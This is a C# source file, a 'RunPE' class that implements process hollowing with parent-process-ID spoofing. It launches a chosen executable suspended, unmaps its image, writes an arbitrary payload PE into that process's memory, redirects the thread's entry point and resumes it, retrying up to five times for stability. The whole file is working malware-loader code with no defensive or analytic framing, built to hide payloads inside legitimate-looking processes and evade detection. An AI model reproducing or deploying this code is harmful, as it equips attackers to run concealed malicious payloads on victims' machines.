using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

/// <summary>
/// Process hollowing implementation for 32-bit and 64-bit process creation.
/// </summary>
public static class RunPE
{
	/// <summary>
	/// Creates a new process using the process hollowing technique.
	/// <para>The bitness of the current process, the created process and the payload must match.</para>
	/// </summary>
	/// <param name="path">The target executable path. This can be any existing file with the same bitness as the current process and <paramref name="payload" />.</param>
	/// <param name="commandLine">The commandline of the created process. This parameter is displayed in task managers, but is otherwise unused.</param>
	/// <param name="payload">The actual executable that is the payload of the new process, regardless of <paramref name="path" /> and <paramref name="commandLine" />.</param>
	/// <param name="parentProcessId">The spoofed parent process ID.</param>
	public static void Run(string path, string commandLine, byte[] payload, int parentProcessId)
	{
		// For 32-bit (and 64-bit?) process hollowing, this needs to be attempted several times.
		// This is a workaround to the well known stability issue of process hollowing.
		for (int i = 0; i < 5; i++)
		{
			int processId = 0;

			try
			{
				int ntHeaders = BitConverter.ToInt32(payload, 0x3c);
				int sizeOfImage = BitConverter.ToInt32(payload, ntHeaders + 0x18 + 0x38);
				int sizeOfHeaders = BitConverter.ToInt32(payload, ntHeaders + 0x18 + 0x3c);
				int entryPoint = BitConverter.ToInt32(payload, ntHeaders + 0x18 + 0x10);
				short numberOfSections = BitConverter.ToInt16(payload, ntHeaders + 0x6);
				short sizeOfOptionalHeader = BitConverter.ToInt16(payload, ntHeaders + 0x14);
				IntPtr imageBase = IntPtr.Size == 4 ? (IntPtr)BitConverter.ToInt32(payload, ntHeaders + 0x18 + 0x1c) : (IntPtr)BitConverter.ToInt64(payload, ntHeaders + 0x18 + 0x18);

				IntPtr parentProcessHandle = OpenProcess(0x80, false, parentProcessId);
				if (parentProcessHandle == IntPtr.Zero) throw new Exception();

				IntPtr parentProcessHandlePtr = Allocate(IntPtr.Size);
				Marshal.WriteIntPtr(parentProcessHandlePtr, parentProcessHandle);

				IntPtr attributeListSize = IntPtr.Zero;
				if (InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref attributeListSize) || attributeListSize == IntPtr.Zero) throw new Exception();

				IntPtr attributeList = Allocate((int)attributeListSize);
				if (!InitializeProcThreadAttributeList(attributeList, 1, 0, ref attributeListSize) ||
					attributeList == IntPtr.Zero ||
					!UpdateProcThreadAttribute(attributeList, 0, (IntPtr)0x20000, parentProcessHandlePtr, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero)) throw new Exception();

				// Use STARTUPINFOEX to implement parent process spoofing
				int startupInfoLength = IntPtr.Size == 4 ? 0x48 : 0x70;
				IntPtr startupInfo = Allocate(startupInfoLength);
				Marshal.Copy(new byte[startupInfoLength], 0, startupInfo, startupInfoLength);
				Marshal.WriteInt32(startupInfo, startupInfoLength);
				Marshal.WriteIntPtr(startupInfo, startupInfoLength - IntPtr.Size, attributeList);

				byte[] processInfo = new byte[IntPtr.Size == 4 ? 0x10 : 0x18];

				IntPtr context = Allocate(IntPtr.Size == 4 ? 0x2cc : 0x4d0);
				Marshal.WriteInt32(context, IntPtr.Size == 4 ? 0 : 0x30, 0x10001b);

				if (!CreateProcess(path, path + " " + commandLine, IntPtr.Zero, IntPtr.Zero, true, 0x80004, IntPtr.Zero, null, startupInfo, processInfo)) throw new Exception();
				processId = BitConverter.ToInt32(processInfo, IntPtr.Size * 2);
				IntPtr process = IntPtr.Size == 4 ? (IntPtr)BitConverter.ToInt32(processInfo, 0) : (IntPtr)BitConverter.ToInt64(processInfo, 0);

				NtUnmapViewOfSection(process, imageBase);

				IntPtr sizeOfImagePtr = (IntPtr)sizeOfImage;
				if (NtAllocateVirtualMemory(process, ref imageBase, IntPtr.Zero, ref sizeOfImagePtr, 0x3000, 0x40) < 0 ||
					NtWriteVirtualMemory(process, imageBase, payload, sizeOfHeaders, IntPtr.Zero) < 0 ||
					!VirtualProtectEx(process, imageBase, (UIntPtr)sizeOfHeaders, 2, out _)) throw new Exception();

				for (short j = 0; j < numberOfSections; j++)
				{
					byte[] section = new byte[0x28];
					Buffer.BlockCopy(payload, ntHeaders + 0x18 + sizeOfOptionalHeader + j * 0x28, section, 0, 0x28);

					byte[] nextSection = new byte[0x28];
					if (j < numberOfSections - 1)
					{
						Buffer.BlockCopy(payload, ntHeaders + 0x18 + sizeOfOptionalHeader + (j + 1) * 0x28, nextSection, 0, 0x28);
					}

					int virtualAddress = BitConverter.ToInt32(section, 0xc);
					int sizeOfRawData = BitConverter.ToInt32(section, 0x10);
					int pointerToRawData = BitConverter.ToInt32(section, 0x14);
					uint characteristics = BitConverter.ToUInt32(section, 0x24);
					int nextSectionVirtualAddress = BitConverter.ToInt32(nextSection, 0xc);

					byte[] rawData = new byte[sizeOfRawData];
					Buffer.BlockCopy(payload, pointerToRawData, rawData, 0, rawData.Length);

					if (NtWriteVirtualMemory(process, (IntPtr)((long)imageBase + virtualAddress), rawData, rawData.Length, IntPtr.Zero) < 0) throw new Exception();
					if (!VirtualProtectEx(process, (IntPtr)((long)imageBase + virtualAddress), (UIntPtr)(j == numberOfSections - 1 ? sizeOfImage - virtualAddress : nextSectionVirtualAddress - virtualAddress), SectionCharacteristicsToProtection(characteristics), out _)) throw new Exception();
				}

				IntPtr thread = IntPtr.Size == 4 ? (IntPtr)BitConverter.ToInt32(processInfo, 4) : (IntPtr)BitConverter.ToInt64(processInfo, 8);
				if (NtGetContextThread(thread, context) < 0) throw new Exception();

				if (IntPtr.Size == 4)
				{
					IntPtr ebx = (IntPtr)Marshal.ReadInt32(context, 0xa4);
					if (NtWriteVirtualMemory(process, (IntPtr)((int)ebx + 8), BitConverter.GetBytes((int)imageBase), 4, IntPtr.Zero) < 0) throw new Exception();
					Marshal.WriteInt32(context, 0xb0, (int)imageBase + entryPoint);
				}
				else
				{
					IntPtr rdx = (IntPtr)Marshal.ReadInt64(context, 0x88);
					if (NtWriteVirtualMemory(process, (IntPtr)((long)rdx + 16), BitConverter.GetBytes((long)imageBase), 8, IntPtr.Zero) < 0) throw new Exception();
					Marshal.WriteInt64(context, 0x80, (long)imageBase + entryPoint);
				}

				if (NtSetContextThread(thread, context) < 0) throw new Exception();
				if (NtResumeThread(thread, out _) == -1) throw new Exception();
			}
			catch
			{
				try
				{
					// If the current attempt failed, terminate the created process to not have suspended "leftover" processes.
					Process.GetProcessById(processId).Kill();
				}
				catch
				{
				}

				continue;
			}

			break;
		}
	}
	/// <summary>
	/// Converts an IMAGE_SECTION_HEADER.Characteristics flag to a memory page protection flag.
	/// </summary>
	/// <param name="characteristics">The characteristics of a section.</param>
	/// <returns>
	/// A <see cref="uint" /> value to be used with VirtualProtectEx.
	/// </returns>
	private static uint SectionCharacteristicsToProtection(uint characteristics)
	{
		if ((characteristics & 0x20000000) != 0 && (characteristics & 0x40000000) != 0 && (characteristics & 0x80000000) != 0)
		{
			return 0x40;
		}
		else if ((characteristics & 0x20000000) != 0 && (characteristics & 0x40000000) != 0)
		{
			return 0x20;
		}
		else if ((characteristics & 0x20000000) != 0 && (characteristics & 0x80000000) != 0)
		{
			return 0x80;
		}
		else if ((characteristics & 0x40000000) != 0 && (characteristics & 0x80000000) != 0)
		{
			return 0x4;
		}
		else if ((characteristics & 0x20000000) != 0)
		{
			return 0x10;
		}
		else if ((characteristics & 0x40000000) != 0)
		{
			return 0x2;
		}
		else if ((characteristics & 0x80000000) != 0)
		{
			return 0x8;
		}
		else
		{
			return 0x1;
		}
	}
	/// <summary>
	/// Allocates memory in the current process with the specified size. If this is a 64-bit process, the memory address is aligned by 16.
	/// </summary>
	/// <param name="size">The amount of memory, in bytes, to allocate.</param>
	/// <returns>An <see cref="IntPtr" /> pointing to the allocated memory.</returns>
	private static IntPtr Allocate(int size)
	{
		int alignment = IntPtr.Size == 4 ? 1 : 16;
		return (IntPtr)(((long)Marshal.AllocHGlobal(size + alignment / 2) + (alignment - 1)) / alignment * alignment);
	}

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern IntPtr OpenProcess(int access, bool inheritHandle, int processId);
	[DllImport("kernel32.dll")]
	private static extern bool CreateProcess(string applicationName, string commandLine, IntPtr processAttributes, IntPtr threadAttributes, bool inheritHandles, uint creationFlags, IntPtr environment, string currentDirectory, IntPtr startupInfo, byte[] processInformation);
	[DllImport("kernel32.dll")]
	private static extern bool VirtualProtectEx(IntPtr process, IntPtr address, UIntPtr size, uint newProtect, out uint oldProtect);
	[DllImport("ntdll.dll", SetLastError = true)]
	private static extern int NtAllocateVirtualMemory(IntPtr process, ref IntPtr address, IntPtr zeroBits, ref IntPtr size, uint allocationType, uint protect);
	[DllImport("ntdll.dll")]
	private static extern int NtWriteVirtualMemory(IntPtr process, IntPtr baseAddress, byte[] buffer, int size, IntPtr bytesWritten);
	[DllImport("ntdll.dll")]
	private static extern uint NtUnmapViewOfSection(IntPtr process, IntPtr baseAddress);
	[DllImport("ntdll.dll")]
	private static extern int NtSetContextThread(IntPtr thread, IntPtr context);
	[DllImport("ntdll.dll")]
	private static extern int NtGetContextThread(IntPtr thread, IntPtr context);
	[DllImport("ntdll.dll")]
	private static extern int NtResumeThread(IntPtr thread, out uint suspendCount);
	[DllImport("kernel32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool InitializeProcThreadAttributeList(IntPtr attributeList, int attributeCount, int flags, ref IntPtr size);
	[DllImport("kernel32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool UpdateProcThreadAttribute(IntPtr attributeList, uint flags, IntPtr attribute, IntPtr value, IntPtr size, IntPtr previousValue, IntPtr returnSize);
}